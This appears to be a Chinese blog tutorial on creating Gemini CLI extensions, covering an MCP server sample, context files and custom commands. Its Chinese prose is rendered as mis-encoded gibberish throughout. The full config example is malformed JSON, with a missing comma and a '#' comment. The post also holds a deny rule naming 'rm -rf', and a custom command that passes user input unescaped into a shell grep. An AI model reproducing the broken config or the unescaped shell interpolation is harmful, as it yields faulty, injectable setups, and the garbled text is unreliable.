<span class="hljs-meta prompt_">$</span><span class="bash">Â gemini extensionsÂ <span class="hljs-built_in">disable</span>Â nanobanana</span>
<span class="hljs-meta prompt_">#</span><span class="bash">Â å…¨å±€ç¦ç”¨æ’ä»¶</span>
<span class="hljs-meta prompt_">$</span><span class="bash">Â gemini extensionsÂ <span class="hljs-built_in">disable</span>Â --scope user nanobanana</span>
<span class="hljs-meta prompt_">#</span><span class="bash">Â é¡¹ç›®ç¦ç”¨æ’ä»¶</span>
<span class="hljs-meta prompt_">$</span><span class="bash">Â gemini extensionsÂ <span class="hljs-built_in">disable</span>Â --scope project nanobanana</span>
</code></pre>
<h2 data-id="heading-11">è‡ªå®šä¹‰æ’ä»¶</h2>
<h3 data-id="heading-12">åˆ›å»ºæ’ä»¶æ¨¡æ¿</h3>
<p>Gemini CLIæä¾›äº†åˆ›å»ºæ’ä»¶å‘½ä»¤ï¼Œå‘½ä»¤æ ¼å¼å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">$ gemini extensionsÂ <span class="hljs-keyword">new</span>Â [<span class="hljs-keyword">template</span>]
</code></pre>
<ul>
<li>pathï¼šæ’ä»¶çš„è·¯å¾„</li>
<li>templateï¼šæ¨¡ç‰ˆç±»å‹ï¼Œå¯é€‰å€¼ï¼š"context"ã€"custom-commands"ã€"exclude-tools"ã€"mcp-server"</li>
</ul>
<p>æ¥ç€åˆ›å»ºæˆ‘ä»¬çš„ç¬¬ä¸€ä¸ªè‡ªå®šä¹‰æ’ä»¶é¡¹ç›®ï¼Œæˆ‘è¿™é‡Œåœ¨å·¥ä½œåŒºè·¯å¾„ï¼Œç›´æ¥åœ¨å½“å‰å·¥ä½œåŒºé¡¹ç›®åŒçº§ç›®å½•åˆ›å»ºè‡ªå®šä¹‰æ’ä»¶é¡¹ç›®äº†</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-variable">$Â gemini</span> extensions <span class="hljs-keyword">new</span> ../my-first-extension mcp-server
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cefbdf0ba1aa496dbad83f39f88f569d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764470500&amp;x-signature=dI0W7bzN3LeenPVoR%2BGmvtAm7vQ%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>åˆ›å»ºå®Œæˆåï¼Œå¯ä»¥çœ‹åˆ°ç›®å½•ç»“æ„å¦‚ä¸‹ï¼Œå…¶å®å°±æ˜¯åˆ›å»ºäº†ä¸€ä¸ªå¸¦æœ‰Gemini CLIæ’ä»¶é…ç½®æ–‡ä»¶ gemini-extension.json çš„NodeJSé¡¹ç›®</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/be4d5645477d42f998715308d68ab548~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764470500&amp;x-signature=CfUE0cr2MObtcAipQwvJcK4nkR0%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/84ed6cf7f1b4427093799d44774f6133~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764470500&amp;x-signature=C8vYqULFohS3s3qImQtsfefjguU%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h3 data-id="heading-13">æ’ä»¶é…ç½®æ–‡ä»¶</h3>
<p>Gemini CLIè‡ªå®šä¹‰æ’ä»¶é…ç½®æ–‡ä»¶ä¸º gemini-extension.jsonï¼Œä¸€ä¸ªå®Œæ•´çš„è‡ªå®šä¹‰æ’ä»¶é…ç½®å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">{
Â Â <span class="hljs-string">"name"</span>:Â <span class="hljs-string">"&lt;æ’ä»¶åç§°&gt;"</span>,
Â Â <span class="hljs-string">"version"</span>:Â <span class="hljs-string">"&lt;æ’ä»¶ç‰ˆæœ¬&gt;"</span>,
Â Â <span class="hljs-string">"contextFileName"</span>:Â <span class="hljs-string">"&lt;ä¸Šä¸‹æ–‡æ–‡ä»¶&gt;"</span>,
Â Â <span class="hljs-string">"excludeTools"</span>: [<span class="hljs-string">"run_shell_command"</span>]
Â Â <span class="hljs-string">"mcpServers"</span>: {Â <span class="hljs-comment"># MCPé…ç½®</span>
Â  Â Â <span class="hljs-string">"nodeServer"</span>: {
Â  Â  Â Â <span class="hljs-string">"command"</span>:Â <span class="hljs-string">"node"</span>,
Â  Â  Â Â <span class="hljs-string">"args"</span>: [<span class="hljs-string">"<span class="hljs-variable">${extensionPath}</span><span class="hljs-variable">${/}</span>dist<span class="hljs-variable">${/}</span>example.js"</span>],
Â  Â  Â Â <span class="hljs-string">"cwd"</span>:Â <span class="hljs-string">"<span class="hljs-variable">${extensionPath}</span>"</span>
Â  Â  }
Â  }
}
</code></pre>
<ul>
<li>name ï¼šæ‰©å±•ç¨‹åºçš„åç§°</li>
<li>version ï¼šæ‰©å±•ç¨‹åºçš„ç‰ˆæœ¬</li>
<li>mcpServers ï¼šMCP æœåŠ¡é…ç½®ï¼Œå¦‚æœæ‰©å±•ç¨‹åºå’Œ settings.json æ–‡ä»¶éƒ½é…ç½®äº†åŒåçš„MCPæœåŠ¡å™¨ï¼Œåˆ™ settings.json æ–‡ä»¶ä¸­å®šä¹‰çš„æœåŠ¡å™¨ä¼˜å…ˆ
<ul>
<li>commandï¼šè„šæœ¬è¿è¡Œçš„æ ¸å¿ƒå‘½ä»¤</li>
<li>argsï¼šè„šæœ¬è¿è¡Œçš„å‚æ•°æ•°ç»„</li>
<li>cwdï¼šè„šæœ¬è¿è¡Œæ—¶çš„å·¥ä½œç›®å½•</li>
</ul>
</li>
<li>contextFileName ï¼šåŒ…å«æ‰©å±•ä¸Šä¸‹æ–‡çš„æ–‡ä»¶çš„åç§°</li>
<li>excludeTools ï¼šè¦ä»æ¨¡å‹ä¸­æ’é™¤çš„å·¥å…·åç§°æ•°ç»„ï¼Œä¾‹å¦‚ï¼š "excludeTools": ["run_shell_command(rm -rf)"] å°†é˜»æ­¢ rm -rf å‘½ä»¤</li>
</ul>
<h3 data-id="heading-14">è‡ªå®šä¹‰MCPæœåŠ¡</h3>
<p>ä¸Šé¢ mcp-server å‘½ä»¤åˆ›å»ºçš„æ¨¡æ¿å·²ç»è‡ªå¸¦äº†ä¸€ä¸ªMCPæœåŠ¡ç¤ºä¾‹ï¼Œç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span>Â {Â <span class="hljs-title class_">McpServer</span>Â }Â <span class="hljs-keyword">from</span>Â <span class="hljs-string">'@modelcontextprotocol/sdk/server/mcp.js'</span>;
<span class="hljs-keyword">import</span>Â {Â <span class="hljs-title class_">StdioServerTransport</span>Â }Â <span class="hljs-keyword">from</span>Â <span class="hljs-string">'@modelcontextprotocol/sdk/server/stdio.js'</span>;
<span class="hljs-keyword">import</span>Â { z }Â <span class="hljs-keyword">from</span>Â <span class="hljs-string">'zod'</span>;
<span class="hljs-keyword">const</span>Â server =Â <span class="hljs-keyword">new</span>Â <span class="hljs-title class_">McpServer</span>({
Â Â <span class="hljs-attr">name</span>:Â <span class="hljs-string">'prompt-server'</span>,
Â Â <span class="hljs-attr">version</span>:Â <span class="hljs-string">'1.0.0'</span>,
});
server.<span class="hljs-title function_">registerTool</span>(
Â Â <span class="hljs-string">'fetch_posts'</span>,
Â  {
Â  Â Â <span class="hljs-attr">description</span>:Â <span class="hljs-string">'Fetches a list of posts from a public API.'</span>,
Â  Â Â <span class="hljs-attr">inputSchema</span>: z.<span class="hljs-title function_">object</span>({}).<span class="hljs-property">shape</span>,
Â  },
Â Â <span class="hljs-keyword">async</span>Â () =&gt; {
Â  Â Â <span class="hljs-keyword">const</span>Â apiResponse =Â <span class="hljs-keyword">await</span>Â <span class="hljs-title function_">fetch</span>(
Â  Â  Â Â <span class="hljs-string">'https://jsonplaceholder.typicode.com/posts'</span>,
Â  Â  );
Â  Â Â <span class="hljs-keyword">const</span>Â posts =Â <span class="hljs-keyword">await</span>Â apiResponse.<span class="hljs-title function_">json</span>();
Â  Â Â <span class="hljs-keyword">const</span>Â response = {Â <span class="hljs-attr">posts</span>: posts.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>,Â <span class="hljs-number">5</span>) };
Â  Â Â <span class="hljs-keyword">return</span>Â {
Â  Â  Â Â <span class="hljs-attr">content</span>: [
Â  Â  Â  Â  {
Â  Â  Â  Â  Â Â <span class="hljs-attr">type</span>:Â <span class="hljs-string">'text'</span>,
Â  Â  Â  Â  Â Â <span class="hljs-attr">text</span>:Â <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(response),
Â  Â  Â  Â  },
Â  Â  Â  ],
Â  Â  };
Â  },
);
server.<span class="hljs-title function_">registerPrompt</span>(
Â Â <span class="hljs-string">'poem-writer'</span>,
Â  {
Â  Â Â <span class="hljs-attr">title</span>:Â <span class="hljs-string">'Poem Writer'</span>,
Â  Â Â <span class="hljs-attr">description</span>:Â <span class="hljs-string">'Write a nice haiku'</span>,
Â  Â Â <span class="hljs-attr">argsSchema</span>: {Â <span class="hljs-attr">title</span>: z.<span class="hljs-title function_">string</span>(),Â <span class="hljs-attr">mood</span>: z.<span class="hljs-title function_">string</span>().<span class="hljs-title function_">optional</span>() },
Â  },
Â Â <span class="hljs-function">(<span class="hljs-params">{ title, mood }</span>) =&gt;</span>Â ({
Â  Â Â <span class="hljs-attr">messages</span>: [
Â  Â  Â  {
Â  Â  Â  Â Â <span class="hljs-attr">role</span>:Â <span class="hljs-string">'user'</span>,
Â  Â  Â  Â Â <span class="hljs-attr">content</span>: {
Â  Â  Â  Â  Â Â <span class="hljs-attr">type</span>:Â <span class="hljs-string">'text'</span>,
Â  Â  Â  Â  Â Â <span class="hljs-attr">text</span>:Â <span class="hljs-string">`Write a haiku<span class="hljs-subst">${mood ?Â <span class="hljs-string">` with the moodÂ <span class="hljs-subst">${mood}</span>`</span>Â :Â <span class="hljs-string">''</span>}</span>Â calledÂ <span class="hljs-subst">${title}</span>. Note that a haiku is 5 syllables followed by 7 syllables followed by 5 syllables `</span>,
Â  Â  Â  Â  },
Â  Â  Â  },
Â  Â  ],
Â  }),
);
<span class="hljs-keyword">const</span>Â transport =Â <span class="hljs-keyword">new</span>Â <span class="hljs-title class_">StdioServerTransport</span>();
<span class="hljs-keyword">await</span>Â server.<span class="hljs-title function_">connect</span>(transport);
</code></pre>
<p>ä¿®æ”¹ package.json é…ç½®æ–‡ä»¶ï¼Œæ·»åŠ MCPè°ƒè¯•ä»£ç é…ç½®</p>
<pre><code class="hljs language-perl" lang="perl">{
Â Â <span class="hljs-string">"name"</span>:Â <span class="hljs-string">"mcp-server-example"</span>,
Â Â <span class="hljs-string">"version"</span>:Â <span class="hljs-string">"1.0.0"</span>,
Â Â <span class="hljs-string">"description"</span>:Â <span class="hljs-string">"Example MCP Server for Gemini CLI Extension"</span>,
Â Â <span class="hljs-string">"type"</span>:Â <span class="hljs-string">"module"</span>,
Â Â <span class="hljs-string">"main"</span>:Â <span class="hljs-string">"example.js"</span>,
Â Â <span class="hljs-string">"scripts"</span>: {
Â  Â Â <span class="hljs-string">"dev"</span>:Â <span class="hljs-string">"npx -yÂ @modelcontextprotocol/inspector node dist/example.js"</span>,
Â  Â Â <span class="hljs-string">"build"</span>:Â <span class="hljs-string">"tsc"</span>
Â  },
Â Â <span class="hljs-string">"devDependencies"</span>: {
Â  Â Â <span class="hljs-string">"typescript"</span>:Â <span class="hljs-string">"~5.4.5"</span>,
Â  Â Â <span class="hljs-string">"@types/node"</span>:Â <span class="hljs-string">"^20.11.25"</span>
Â  },
Â Â <span class="hljs-string">"dependencies"</span>: {
Â  Â Â <span class="hljs-string">"@modelcontextprotocol/sdk"</span>:Â <span class="hljs-string">"^1.11.0"</span>,
Â  Â Â <span class="hljs-string">"zod"</span>:Â <span class="hljs-string">"^3.22.4"</span>
Â  }
}
</code></pre>
<p>æ‰§è¡Œ npm run build ç¼–è¯‘TSï¼Œç„¶åæ‰§è¡Œä¸‹é¢å‘½ä»¤å¯åŠ¨MCPè°ƒè¯•æœåŠ¡</p>
<pre><code class="hljs language-arduino" lang="arduino">$Â npm run dev
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e8bfb779192143e3a53e0ede25e654db~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764470500&amp;x-signature=eLcugDuILB8Y1M1Wf07Eue1WVAo%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>æœåŠ¡å¯åŠ¨å®Œæˆï¼Œç‚¹å‡»è°ƒè¯•æœåŠ¡é“¾æ¥åœ¨æµè§ˆå™¨ä¸­æ‰“å¼€</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d4fc42ecabc24db8bac3d52386c1f55f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764470500&amp;x-signature=Wr%2FEl9iuACv%2FnlxZaGkIUUBRrPE%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>ç‚¹å‡»ã€Connectã€‘è¿æ¥æœ¬åœ°MCPæœåŠ¡</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/84b8b78995644813b621502714c152bb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764470500&amp;x-signature=26u8KzKqtxi%2BpuAerAJwxJ58564%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>é€‰æ‹©ã€Toolsã€‘æµ‹è¯•ä¸€ä¸‹MCPæœåŠ¡æ˜¯å¦æ­£å¸¸</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c3b5bb12989f44ee8a329b4cee3077c9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764470500&amp;x-signature=HZ87nWfPuf7JIO9C7RMPJxtDbKg%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>æ— è¯¯åï¼Œä½¿ç”¨ gemini extensions validate éªŒè¯ä¸€ä¸‹æ’ä»¶çš„æœ‰æ•ˆæ€§</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_">$</span><span class="bash">Â gemini extensions validate ../my-first-extension</span>Â 
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9fcedd53d9c74ea6a67d00ee78cb5ebe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764470500&amp;x-signature=IqC72CEPBTE%2ByVjrsN3vLUjwFVE%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>éªŒè¯æˆåŠŸåå³å¯ä½¿ç”¨ gemini extensions install å®‰è£…ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ gemini extensions link è¿›è¡Œç¬¦å·é“¾æ¥ï¼ˆç¬¦å·é“¾æ¥çš„å¥½å¤„å°±æ˜¯ä»»ä½•æ›´æ”¹éƒ½ä¼šç«‹å³ç”Ÿæ•ˆï¼Œæ— éœ€é‡æ–°å®‰è£…ï¼‰ï¼Œæˆ‘è¿™é‡Œä½¿ç”¨ gemini extensions link æ¼”ç¤º</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_">$</span><span class="bash">Â gemini extensionsÂ <span class="hljs-built_in">link</span>Â ../my-first-extension</span>
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/05fbe5d6728e4c2c8fc29f0ade71b905~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764470500&amp;x-signature=VdFBTmiR6zYPJzYbYWRvYzjlC3g%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å®‰è£…æˆ–è€…é“¾æ¥æˆåŠŸåï¼Œå°±å¯ä»¥ä½¿ç”¨ gemini extensions list æŸ¥çœ‹åˆ°æˆ‘ä»¬è‡ªå®šä¹‰çš„æ’ä»¶äº†</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4fd5c047a42440b790db067598dbdc6c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764470500&amp;x-signature=yaWk3ZCVC1QwBk0ZaXwBSw4B%2BIY%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h3 data-id="heading-15">è‡ªå®šä¹‰ä¸Šä¸‹æ–‡</h3>
<p>åœ¨è‡ªå®šä¹‰æ’ä»¶ç›®å½•æ–°å»ºä¸€ä¸ª GEMINI.md ç›®å½•ç”¨äºå­˜æ”¾è‡ªå®šä¹‰ä¸Šä¸‹æ–‡å†…å®¹</p>
<pre><code class="hljs language-sql" lang="sql"># MyÂ <span class="hljs-keyword">First</span>Â Extension Instructions
YouÂ <span class="hljs-keyword">are</span>Â an expert developer assistant.Â <span class="hljs-keyword">When</span>Â theÂ <span class="hljs-keyword">user</span>Â asks youÂ <span class="hljs-keyword">to</span>Â <span class="hljs-keyword">fetch</span>
posts, use the `fetch_posts` tool. Be conciseÂ <span class="hljs-keyword">in</span>Â your responses.
</code></pre>
<p>é…ç½®å®Œæˆåï¼Œæ›´æ–° gemini-extension.json æ–‡ä»¶ï¼ŒæŒ‡å®š contextFileName å±æ€§</p>
<pre><code class="hljs language-bash" lang="bash">{
Â Â <span class="hljs-string">"name"</span>:Â <span class="hljs-string">"mcp-server-example"</span>,
Â Â <span class="hljs-string">"version"</span>:Â <span class="hljs-string">"1.0.0"</span>,
Â Â <span class="hljs-string">"mcpServers"</span>: {
Â  Â Â <span class="hljs-string">"nodeServer"</span>: {
Â  Â  Â Â <span class="hljs-string">"command"</span>:Â <span class="hljs-string">"node"</span>,
Â  Â  Â Â <span class="hljs-string">"args"</span>: [<span class="hljs-string">"<span class="hljs-variable">${extensionPath}</span><span class="hljs-variable">${/}</span>dist<span class="hljs-variable">${/}</span>example.js"</span>],
Â  Â  Â Â <span class="hljs-string">"cwd"</span>:Â <span class="hljs-string">"<span class="hljs-variable">${extensionPath}</span>"</span>
Â  Â  }
Â  },
Â Â <span class="hljs-string">"contextFileName"</span>:Â <span class="hljs-string">"GEMINI.md"</span>
}
</code></pre>
<p>ä½¿ç”¨ gemini extensions list å¯ä»¥çœ‹åˆ°åˆšåˆšæ·»åŠ çš„ä¸Šä¸‹æ–‡ä¿¡æ¯</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/989dbf3af30e48658289cb9d6635a1ff~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764470500&amp;x-signature=H7OX6EWlJ%2FWuWpn48Euec%2FXaLK4%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å¯åŠ¨Gemini CLIï¼Œåœ¨äº¤äº’å¼å‘½ä»¤ä¸­è¾“å…¥ /memory show å¯ä»¥æŸ¥çœ‹å…·ä½“çš„ä¸Šä¸‹æ–‡å†…å®¹ï¼Œæ­¤æ—¶å·²ç»åŒ…å«äº†è‡ªå®šä¹‰æ’ä»¶ä¸­çš„ä¸Šä¸‹æ–‡äº†</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8e232a1afa7c43099a851609e39b3680~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764470500&amp;x-signature=r7IN4dHTtHySeGKv%2FbVBqAR%2B0ps%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h3 data-id="heading-16">è‡ªå®šä¹‰å‘½ä»¤</h3>
<p>åœ¨è‡ªå®šä¹‰æ’ä»¶ç›®å½•æ–°å»ºä¸€ä¸ª commandsç›®å½•ç”¨äºå­˜æ”¾è‡ªå®šä¹‰å‘½ä»¤ï¼Œè‡ªå®šä¹‰å‘½ä»¤æ–‡æ¡£å¯ä»¥æŸ¥çœ‹å®˜æ–¹æ–‡æ¡£ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgeminicli.com%2Fdocs%2Fcli%2Fcustom-commands%2F" target="_blank" title="https://geminicli.com/docs/cli/custom-commands/" ref="nofollow noopener noreferrer">geminicli.com/docs/cli/cuâ€¦</a></p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_">$</span><span class="bash">Â <span class="hljs-built_in">mkdir</span>Â commands</span>
</code></pre>
<p>åˆ›å»ºä¸€ä¸ª hello.toml æ–‡ä»¶ç”¨äºç¬¬ä¸€ä¸ªè‡ªå®šä¹‰å‘½ä»¤ï¼Œå¹¶é…ç½®å‘½ä»¤</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">prompt</span>Â =Â <span class="hljs-string">"è¾“å‡ºç¤¼è²Œé—®å€™è¯­å¹¶ä»¥`*_*`å¼€å§‹"</span>
</code></pre>
<p>å†åˆ›å»ºä¸€ä¸ª fs å­å‘½ä»¤ç›®å½•ï¼Œåˆ›å»ºä¸€ä¸ª grep-code.toml æ–‡ä»¶</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_">$</span><span class="bash">Â <span class="hljs-built_in">mkdir</span>Â fs</span>
<span class="hljs-meta prompt_">$</span><span class="bash">Â <span class="hljs-built_in">touch</span>Â fs/grep-code.toml</span>
</code></pre>
<p>è¾“å…¥æç¤ºè¯ä¿å­˜</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">prompt</span>Â =Â <span class="hljs-string">"""
Please summarize the findings for the pattern `{{args}}`.
Search Results:
!{grep -r {{args}} .}
"""</span>
</code></pre>
<p>ç›®å½•ç»“æ„å¦‚ä¸‹ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/de56e5d05b094e559fd0860525d72a30~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764470500&amp;x-signature=t%2BYnRwxJ0EGIyfI0TFvIll1qoTQ%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>é‡å¯Gemini CLIï¼Œåœ¨äº¤äº’å¼å‘½ä»¤ä¸­è¾“å…¥ / åœ¨å‘½ä»¤åˆ—è¡¨çœ‹åˆ°è‡ªå®šä¹‰çš„å‘½ä»¤</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7226eb98111646a984318676230c2a10~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764470500&amp;x-signature=qjwQFJAgbvr%2Bax%2FzAg0G32XyLRU%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>ç›´æ¥è°ƒç”¨è‡ªå®šä¹‰å‘½ä»¤å³å¯æ‰§è¡Œ</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a9d17ed400dc4f6b9ddfc50f88e61c76~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764470500&amp;x-signature=Qu3rcr7yyuRKrBUo%2B6VRvIu%2FnpU%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h2 data-id="heading-17">å¸¸è§é—®é¢˜</h2>
<h3 data-id="heading-18">MCPæˆæƒå¤±è´¥</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/15369c7ac7f24f50b0f94e424a5dc76a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764470500&amp;x-signature=lZrISKLZvZrQcXdUfhqkFQ2QCkw%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>æ ¹æ®æç¤ºå¯çŸ¥ï¼Œè°ƒç”¨ Nano Banana MCP éœ€è¦å¯¼å‡ºAPI Keyï¼ŒGithubä¸Šä¹Ÿæœ‰å¯¹åº”çš„æè¿°</p>
<p>Nano Banana Githubåœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fgemini-cli-extensions%2Fnanobanana" target="_blank" title="https://github.com/gemini-cli-extensions/nanobanana" ref="nofollow noopener noreferrer">github.com/gemini-cli-â€¦</a></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d162f09c850e4fb5b948a8c741e0f55e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764470500&amp;x-signature=C0UwU2kFApwxnZb51WgOBcXVF90%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>æˆ‘ä½¿ç”¨çš„æ˜¯Gemini API Keyï¼Œåœ¨å‘½ä»¤è¡Œç»ˆç«¯å¯¼å‡º GEMINI_API_KEY</p>
<pre><code class="hljs language-ini" lang="ini">exportÂ <span class="hljs-attr">GEMINI_API_KEY</span>=your api key
</code></pre>
<h3 data-id="heading-19">MCPè°ƒç”¨å¤±è´¥</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/762b851b4f9f4f2ba6047a3b0cc7dd41~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764470500&amp;x-signature=uv%2BgkmOqSvfk5F096neBRyj%2B08c%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>Nano Bananaè°ƒç”¨å°šæœ‰é—®é¢˜ï¼ŒGithub Issueï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fgemini-cli-extensions%2Fnanobanana%2Fissues%2F18" target="_blank" title="https://github.com/gemini-cli-extensions/nanobanana/issues/18" ref="nofollow noopener noreferrer">github.com/gemini-cli-â€¦</a></p>
<h2 data-id="heading-20">å‹æƒ…æç¤º</h2>
<p>è§åŸæ–‡ï¼š<a href="https://link.juejin.cn?target=https%253A%2F%2Fmp.weixin.qq.com%2Fs%2FQZb3T5ogImCFAEX8oi4xLw" target="_blank" title="https%3A//mp.weixin.qq.com/s/QZb3T5ogImCFAEX8oi4xLw" ref="nofollow noopener noreferrer">Gemini CLIä¸Šçº¿æ’ä»¶ç³»ç»Ÿ</a></p>
<blockquote>
<p>æœ¬æ–‡åŒæ­¥è‡ªå¾®ä¿¡å…¬ä¼—å· "<a href="https://link.juejin.cn?target=https%253A%2F%2Fmp.weixin.qq.com%2Fs%2FQZb3T5ogImCFAEX8oi4xLw" target="_blank" title="https%3A//mp.weixin.qq.com/s/QZb3T5ogImCFAEX8oi4xLw" ref="nofollow noopener noreferrer">ç¨‹åºå‘˜å°æºª</a>" ï¼Œè¿™é‡Œåªæ˜¯åŒæ­¥ï¼Œæƒ³çœ‹åŠæ—¶æ¶ˆæ¯è¯·ç§»æ­¥æˆ‘çš„å…¬ä¼—å·ï¼Œä¸å®šæ—¶æ›´æ–°æˆ‘çš„å­¦ä¹ ç»éªŒã€‚å‹æƒ…æç¤ºå‹æƒ…æç¤º</p>
